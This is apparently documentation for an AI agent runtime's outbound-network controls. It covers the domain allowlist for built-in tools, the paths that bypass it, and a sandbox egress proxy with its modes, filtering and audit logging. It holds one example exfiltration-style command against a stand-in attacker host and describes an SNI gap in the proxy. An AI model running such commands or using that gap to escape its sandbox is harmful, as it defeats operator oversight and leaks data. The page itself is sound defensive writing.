# Egress

The skill-set `egress.domains` allowlist is a defense-in-depth control on a specific set of agent built-in tools, not a network boundary. This page documents what `egress.domains` covers, what it does not, and where operators bound the gaps.

## What `egress.domains` covers

`EgressClient` mediates outbound HTTP for four built-in agent paths:

- `web_search`: the agent's web-search tool.
- `generate_image`: the agent's image-generation tool.
- `http_request`: the agent's general HTTP tool. The runtime applies the skill-side `tools.allow`, `credentials.allow`, and `http.post_paths` gates first (`crates/agent/src/runtime.rs:2565`, `crates/agent/src/http_tool.rs::gate`); requests that clear those still go out through `EgressClient`, so the host allowset applies on top.
- The Zirkel daily-fetch transport: `wirken zirkel run` uses an `EgressClient` constructed with an explicit `RateLimitConfig` so per-source daily budgets apply.

Each call resolves the request host against the agent's effective `egress.domains` allowset (the union of every loaded skill's `egress.domains` declaration). Hosts not in the allowset are denied pre-flight, before any TCP connection and without consuming the rate-limit budget. Wildcard `"*"` is supported on the allowset; `"*.example.com"` style suffix patterns are also supported.

Source: `crates/agent/src/egress.rs:281-317` (host-based check), `crates/agent/src/skill_perms.rs:964-1010` (allowset resolution).

## What `egress.domains` does not cover

Three outbound paths bypass `EgressClient` entirely and are not constrained by skill-side allowlists. The `exec` sink has its own separate control, described under [Sandbox egress](#sandbox-egress); the other two are bounded only by the operator's network config.

### `exec` shell sink

When the agent invokes the `exec` tool, the shell runs the command inside the sandbox container. Anything that command does (`curl https://attacker.example.com`, `wget`, `nc`, and so on) goes through the container's network namespace, not through `EgressClient`. The skill-side `egress.domains` allowlist is not consulted for this path; sandbox egress is a separate axis, described under [Sandbox egress](#sandbox-egress) below.

Under `mode: off` the shell runs on the host directly and has no network bound at all. That mode is opt-in and requires explicit operator firewalling (`iptables`, `nftables`, `pf`) if the shell must be constrained.

### MCP server children

MCP servers spawned by `wirken-mcp-proxy` are separate processes at the wirken UID with no process-level sandbox. They open their own outbound connections (HTTP, WebSocket, stdio, whatever the server speaks) directly through the OS. The agent's permission gate checks the MCP tool *name* before invocation but does not constrain what the child does once spawned.

**Mitigation.** Same as the `exec` sink: OS-level network controls. The gateway lists configured MCP server names at startup so the operator can see the inventory; install MCP servers only from trusted sources, and pin versions in `mcp.json`.

### LLM HTTP client

The agent's LLM client uses its own `reqwest::Client` so traffic to the configured provider always works regardless of the operator's egress posture for skill tools. The provider host is gated by `provider.json::base_url` (and by the bound channel-override `base_url` for channel-specific overrides) but not by `egress.domains`.

This is deliberate: an `egress.domains` rule that accidentally excludes the provider would break the agent entirely with a vague tool-side error, when the right place to enforce provider-host policy is the operator's network config.

**Mitigation.** Provider choice plus network controls. For TEE-backed providers (Tinfoil, Privatemode), end-to-end encryption to the enclave gives an additional confidentiality layer that does not depend on the network path.

## Sandbox egress

Sandboxed `exec` has its own egress axis, configured per channel on the agent's `AgentConfig::channel_egress` and enforced at the container boundary rather than in `EgressClient`. It is independent of `egress.domains`: a skill-side allowlist grants nothing to the shell, and a channel egress allowlist grants nothing to `web_search` or `http_request`.

### Modes

| Mode | Container networking | Reach |
| --- | --- | --- |
| `none` | `--network none` | Nothing. No proxy is started. |
| `allowlist` | Internal network, proxy only | Domains matching the channel's `domains` list. |
| `open` | Internal network, proxy only | Any domain, still subject to the port and address rules below. |

`none` is the default and the posture every unresolved case lands on: a channel with no entry, a turn with no channel (cron, CLI `ask`), an unrecognized mode string, and a stored policy blob that no longer parses. `open` is reachable only by writing it explicitly.

Source: `crates/agent/src/sandbox_egress.rs`, `crates/gateway/src/agent_config.rs::ChannelEgress`.

### Topology

In `allowlist` and `open` modes the container joins a per-exec Docker network created `Internal` with `com.docker.network.bridge.enable_icc=false` and IP masquerade off. That network has no default route, so the only address the container can reach is the bridge gateway, where this exec's proxy listens. Inter-container reach is closed by the ICC option, and each exec gets its own network besides. A process that ignores `HTTP_PROXY` and opens a raw socket does not bypass the allowlist; it has nowhere to route.

The container has no working resolver: DNS is pinned to an address with nothing behind it, and the internal network cannot reach an external resolver in any case. The proxy resolves the hostname itself, after the allowlist decision.

### Properties

- **HTTP(S) or nothing.** `CONNECT` on 443 and plain HTTP on 80 are the only shapes proxied. There is no generic TCP forward, so SSH, database protocols, and raw sockets are unreachable from a sandbox whatever the allowlist says. A `CONNECT` to any other port is refused.
- **Domain match only.** IP-literal targets are refused before the allowlist is consulted, so an entry can never authorize a bare address. Matching reuses the same `host_in_set` helper as skill-side `egress.domains`, so `*` and `*.example.com` behave identically on both axes.
- **Resolved addresses are filtered.** After resolution, addresses outside global unicast are dropped: loopback, private, link-local (which covers the `169.254.169.254` metadata address), unique-local, and carrier-grade NAT. An allowlisted name whose DNS answer points inside the host's own network does not get connected to.
- **Attribution is structural.** Each exec gets its own listener carrying the agent, channel, adapter, and sender it was bound to. No field on a denial row is parsed out of request content, so a sandboxed process cannot forge its own attribution.

### Runtime requirement

`allowlist` and `open` need a container runtime whose bridge gateway is a host interface, which means rootful Docker. Under a rootless runtime the bridge sits in its own network namespace and the gateway address is not assignable on the host, so the proxy cannot bind it. That case fails closed: `exec` is refused with an error naming the cause, rather than running with unproxied networking. Rootless deployments should leave channels on `none`.

Docker and Podman also spell the inter-container option differently (`com.docker.network.bridge.enable_icc=false` against Podman's `isolate`); only the Docker spelling is sent, and Podman rejects the unknown option at network-create time, which is the same fail-closed refusal.

### Known limit

`CONNECT` allowlisting is decided on the CONNECT target and the tunnel is not inspected after that. A client that connects to an allowlisted host and then presents a different SNI reaches whatever that host's address serves for the name. Where a shared-IP CDN fronts both an allowed and a denied origin, the allowlist is only as tight as that address. Closing this would require terminating TLS in the proxy, which this design deliberately does not do.

### Audit

Every refusal emits `SessionEvent::SandboxEgressDenied` on the agent's hash-chained session log, carrying the host, port, the mode in force, a closed-set reason (`mode_none`, `not_allowed`, `ip_literal`, `port_not_allowed`, `method_not_allowed`, `malformed`, `resolution_failed`), and the structural attribution. The variant is forwarded to a typed SIEM by default. Allowed requests do not emit a row on this axis; the tool call itself is already on the chain.

## Cross-reference

The same gap appears in [security-properties.md](security-properties.md) under AG02 (Code execution), where it is described as a code-execution surface rather than a configuration-side scope. The two pages describe the same constraint from different angles; if you are reading this page to evaluate a deployment, the AG02 row carries the threat-model context.

## Source references

- `EgressClient` scope and host check: `crates/agent/src/egress.rs:167-318`.
- Allowset and wildcard resolution: `crates/agent/src/skill_perms.rs:964-1010`, matching at `crates/agent/src/skill_perms.rs:583-599`.
- Threat-model row: [security-properties.md](security-properties.md), row `AG02` (Code execution).
